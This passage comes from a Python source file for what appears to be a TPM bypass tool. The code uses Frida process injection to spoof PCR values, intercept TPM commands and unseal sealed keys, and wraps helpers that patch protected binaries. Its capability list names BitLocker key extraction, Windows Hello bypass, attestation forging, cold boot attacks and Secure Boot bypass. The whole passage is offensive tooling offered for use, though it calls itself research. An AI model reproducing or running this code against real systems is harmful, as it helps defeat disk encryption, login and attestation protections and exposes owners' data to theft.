            self.logger.error("Failed to spoof clean boot state")
            return False

        except Exception as e:
            self.logger.error(f"Measured boot bypass failed: {e}")
            return False

    def get_intercepted_commands_frida(self) -> list[dict[str, Any]]:
        """Get intercepted TPM commands from Frida script.

        Returns:
            List of intercepted command records

        """
        if not self.frida_script:
            self.logger.warning("No active Frida script")
            return []

        try:
            commands = self.frida_script.exports_sync.get_intercepted_commands()
            return commands if commands else []

        except Exception as e:
            self.logger.error(f"Failed to get intercepted commands: {e}")
            return []

    def get_pcr_operations_frida(self) -> list[dict[str, Any]]:
        """Get PCR operations log from Frida script.

        Returns:
            List of PCR operation records

        """
        if not self.frida_script:
            self.logger.warning("No active Frida script")
            return []

        try:
            operations = self.frida_script.exports_sync.get_operations()
            return operations if operations else []

        except Exception as e:
            self.logger.error(f"Failed to get PCR operations: {e}")
            return []

    def detach_frida(self) -> None:
        """Detach Frida session and cleanup."""
        try:
            if self.frida_script:
                self.frida_script.unload()
                self.frida_script = None
                self.logger.info("Frida script unloaded")

            if self.frida_session and not self.frida_session.is_detached:
                self.frida_session.detach()
                self.logger.info("Frida session detached")

            self.frida_session = None
            self.frida_device = None
            self.frida_pid = None

        except Exception as e:
            self.logger.error(f"Error detaching Frida: {e}")

    def runtime_unseal_bypass(self, target_binary: str, sealed_blob: bytes, pcr_policy: dict[int, bytes] | None = None) -> bytes | None:
        """Perform runtime unsealing bypass using Frida injection.

        Args:
            target_binary: Target binary using TPM unsealing
            sealed_blob: Sealed key blob to unseal
            pcr_policy: Optional PCR policy to bypass

        Returns:
            Unsealed key data or None

        """
        try:
            if not self.attach_to_process_frida(target_binary):
                return None

            if not self.inject_pcr_manipulator(pcr_policy):
                self.detach_frida()
                return None

            if pcr_policy:
                self.logger.info("Spoofing PCR values for unsealing...")
                for pcr_idx, pcr_val in pcr_policy.items():
                    self.spoof_pcr_runtime(pcr_idx, pcr_val)

            if not self.inject_tpm_command_interceptor():
                self.detach_frida()
                return None

            self.logger.info("Runtime bypass active - monitoring for unseal operations...")

            unsealed_key = self.unseal_tpm_key(sealed_blob, b"", pcr_policy)

            time.sleep(2)

            return unsealed_key

        except Exception as e:
            self.logger.error(f"Runtime unseal bypass failed: {e}")
            return None
        finally:
            self.detach_frida()

    def export_bypass_session(self) -> dict[str, Any]:
        """Export current bypass session data for analysis or replay.

        Returns:
            Complete session data

        """
        frida_data = {}
        if self.frida_session and not self.frida_session.is_detached:
            frida_data = {
                "attached": True,
                "pid": self.frida_pid,
                "script_loaded": self.frida_script is not None,
                "intercepted_commands": self.get_intercepted_commands_frida(),
                "pcr_operations": self.get_pcr_operations_frida(),
            }

        return {
            "tpm_version": self.tpm_version,
            "pcr_state": {
                algo.name: {
                    "pcr_values": [pcr.hex() for pcr in bank.pcr_values],
                    "selection_mask": bank.selection_mask,
                }
                for algo, bank in self.pcr_banks.items()
            },
            "intercepted_commands": self.intercepted_commands,
            "command_hooks": list(self.command_hooks.keys()),
            "sealed_keys_extracted": len(self.sealed_keys),
            "virtualized_tpm_state": {
                "state": self.virtualized_tpm.get("state", "unknown") if self.virtualized_tpm else "unknown",
                "persistent_handles": list(self.virtualized_tpm.get("persistent_handles", {}).keys()) if self.virtualized_tpm else [],
                "transient_handles": list(self.virtualized_tpm.get("transient_handles", {}).keys()) if self.virtualized_tpm else [],
                "session_handles": list(self.virtualized_tpm.get("session_handles", {}).keys()) if self.virtualized_tpm else [],
            },
            "frida_session": frida_data,
            "capabilities": self.get_bypass_capabilities(),
        }


TPMProtectionBypass = TPMBypassEngine


def detect_tpm_usage(binary_path: str) -> bool:
    """Detect if binary uses TPM protection.

    Args:
        binary_path: Path to binary to analyze

    Returns:
        True if TPM usage detected, False otherwise

    """
    engine = TPMBypassEngine()
    return engine.detect_tpm_usage(binary_path)


def analyze_tpm_protection(binary_path: str) -> dict:
    """Analyze TPM protection in binary.

    Args:
        binary_path: Path to binary to analyze

    Returns:
        Dictionary containing analysis results

    """
    engine = TPMBypassEngine()
    return engine.analyze_tpm_protection(binary_path)


def bypass_tpm_protection(binary_path: str, output_path: str = None) -> bool:
    """Bypass TPM protection in binary.

    Args:
        binary_path: Path to protected binary
        output_path: Path for patched output (optional)

    Returns:
        True if bypass successful, False otherwise

    """
    engine = TPMBypassEngine()
    return engine.bypass_tpm_protection(binary_path, output_path)


def tpm_research_tools() -> dict:
    """Get available TPM research tools and utilities.

    Returns:
        Dictionary of available tools and their descriptions

    """
    return {
        "tpm_bypass_engine": "Main TPM bypass engine with full TPM 1.2 and 2.0 capabilities",
        "tpm_protection_bypass": "Alias for TPMBypassEngine",
        "detect_tpm_usage": "Detect TPM usage in binaries",
        "analyze_tpm_protection": "Analyze TPM protection mechanisms",
        "bypass_tpm_protection": "Bypass TPM protection in binaries through patching",
        "capabilities": [
            "TPM command interception and hooking",
            "PCR (Platform Configuration Register) manipulation",
            "TPM-sealed key extraction and unsealing",
            "TPM attestation bypass and quote forging",
            "Support for both TPM 1.2 and TPM 2.0",
            "Windows TBS (TPM Base Services) hooking",
            "BitLocker VMK extraction",
            "Windows Hello bypass",
            "Cold boot memory extraction attack",
            "Measured boot bypass",
            "Binary analysis and patching",
            "Runtime TPM bypass via Frida injection",
            "Runtime PCR value spoofing",
            "Runtime command interception and modification",
            "Secure Boot bypass at runtime",
            "Dynamic unsealing of TPM-protected keys",
        ],
        "runtime_methods": {
            "attach_to_process_frida": "Attach to running process with Frida for runtime bypass",
            "inject_tpm_command_interceptor": "Inject TPM command interceptor script",
            "inject_pcr_manipulator": "Inject PCR manipulation script",
            "spoof_pcr_runtime": "Spoof individual PCR values at runtime",
            "block_pcr_extend_runtime": "Block PCR extend operations at runtime",
            "bypass_secure_boot_runtime": "Bypass Secure Boot checks at runtime",
            "bypass_measured_boot_runtime": "Bypass measured boot at runtime",
            "runtime_unseal_bypass": "Unseal TPM keys at runtime with full bypass",
            "get_intercepted_commands_frida": "Retrieve intercepted commands from Frida",
            "get_pcr_operations_frida": "Retrieve PCR operations log from Frida",
            "detach_frida": "Detach Frida session and cleanup",
        },
        "static_methods": {
            "bypass_attestation": "Forge TPM attestation data",
            "extract_sealed_keys": "Extract sealed keys from NVRAM",
            "spoof_remote_attestation": "Spoof remote attestation responses",
            "extract_bitlocker_vmk": "Extract BitLocker Volume Master Key",
            "bypass_windows_hello": "Bypass Windows Hello TPM authentication",
            "cold_boot_attack": "Perform cold boot memory attack",
            "reset_tpm_lockout": "Reset TPM lockout counter",
            "clear_tpm_ownership": "Clear TPM ownership",
        },
    }
